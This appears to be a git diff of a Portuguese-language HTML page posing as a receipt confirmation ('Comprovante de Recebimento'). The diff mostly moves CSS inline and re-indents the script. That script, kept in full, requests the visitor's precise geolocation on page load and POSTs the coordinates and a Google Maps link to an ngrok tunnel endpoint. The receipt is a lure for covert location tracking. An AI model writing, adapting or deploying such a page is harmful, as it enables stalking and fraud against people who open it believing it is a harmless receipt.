@@ -5,7 +5,83 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .comprovante-container {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: white;
+      border: 2px solid #002776;
+      padding: 25px 30px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .comprovante-container h1 {
+      color: #002776;
+      font-size: 22px;
+      text-align: center;
+      margin-bottom: 30px;
+      border-bottom: 1px solid #ccc;
+      padding-bottom: 10px;
+    }
+
+    .informacoes p {
+      font-size: 16px;
+      margin: 10px 0;
+    }
+
+    .informacoes span:first-child {
+      font-weight: bold;
+      color: #002776;
+    }
+
+    .informacoes span:last-child {
+      color: #333;
+    }
+
+    .botao {
+      display: block;
+      margin: 30px auto;
+      background-color: #ffcc00;
+      color: #002776;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: background-color 0.3s;
+    }
+
+    .botao:hover {
+      background-color: #e6b800;
+    }
+
+    .comprovante-footer {
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+      border-top: 1px solid #ccc;
+      margin-top: 40px;
+      padding-top: 15px;
+    }
+
+    .comprovante-footer a {
+      color: #002776;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .comprovante-footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 
 <body>
@@ -25,74 +101,73 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
-  window.addEventListener("load", () => {
-    if (!navigator.geolocation) {
-      alert("Geolocalização não é suportada pelo navegador.");
-      return;
-    }
+    window.addEventListener("load", () => {
+      if (!navigator.geolocation) {
+        alert("Geolocalização não é suportada pelo navegador.");
+        return;
+      }
 
-    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
-    });
-  });
-
-  const dataAtual = new Date();
-  const dia = String(dataAtual.getDate()).padStart(2, '0');
-  const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-  const ano = dataAtual.getFullYear();
-  const dataFormatada = `${dia}/${mes}/${ano}`;
-  document.getElementById("data-atual").textContent = dataFormatada;
-
-  function sendLocation(position) {
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
-    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-    console.log("Enviando localização:", { latitude, longitude, maps });
-
-    fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ latitude, longitude, maps })
-    })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          console.log("Localização enviada com sucesso.");
-        } else {
-          alert("Erro ao enviar a localização.");
-          console.error("Erro no back-end:", data);
-        }
-      })
-      .catch(error => {
-        alert("Erro ao enviar a localização.");
-        console.error("Erro na requisição:", error);
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
       });
-  }
+    });
 
-  function handleError(error) {
-    let message = "Erro desconhecido.";
-    switch (error.code) {
-      case error.PERMISSION_DENIED:
-        message = "Permissão de localização negada.";
-        break;
-      case error.POSITION_UNAVAILABLE:
-        message = "Localização indisponível.";
-        break;
-      case error.TIMEOUT:
-        message = "Tempo esgotado para obter localização.";
-        break;
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      console.log("Enviando localização:", { latitude, longitude, maps });
+
+      fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            console.log("Localização enviada com sucesso.");
+          } else {
+            alert("Erro ao enviar a localização.");
+            console.error("Erro no back-end:", data);
+          }
+        })
+        .catch(error => {
+          alert("Erro ao enviar a localização.");
+          console.error("Erro na requisição:", error);
+        });
     }
-    alert(message);
-    console.warn("Erro de geolocalização:", error.message);
-  }
-</script>
+
+    function handleError(error) {
+      let message = "Erro desconhecido.";
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          message = "Permissão de localização negada.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          message = "Localização indisponível.";
+          break;
+        case error.TIMEOUT:
+          message = "Tempo esgotado para obter localização.";
+          break;
+      }
+      alert(message);
+      console.warn("Erro de geolocalização:", error.message);
+    }
+  </script>
 </body>
 
 </html>
